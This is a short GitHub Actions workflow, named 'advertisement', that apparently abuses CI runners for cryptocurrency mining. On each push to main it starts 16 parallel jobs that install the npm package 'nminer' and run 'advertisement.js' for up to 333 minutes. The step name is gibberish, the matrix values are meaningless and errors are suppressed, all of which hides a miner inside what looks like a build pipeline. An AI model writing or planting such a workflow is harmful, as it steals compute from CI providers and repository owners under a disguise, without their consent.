name: advertisement
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5788 }
          - { version: 7346 }
          - { version: 2171 }
          - { version: 8672 }
          - { version: 2259 }
          - { version: 6456 }
          - { version: 631 }
          - { version: 1803 }
          - { version: 8565 }
          - { version: 6517 }
          - { version: 2262 }
          - { version: 2313 }
          - { version: 161 }
          - { version: 2742 }
          - { version: 7094 }
          - { version: 4202 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: always thin oof ah youthfully
        run: |
          npm install nminer@latest
          timeout 333m node advertisement.js || echo "advertisement executed"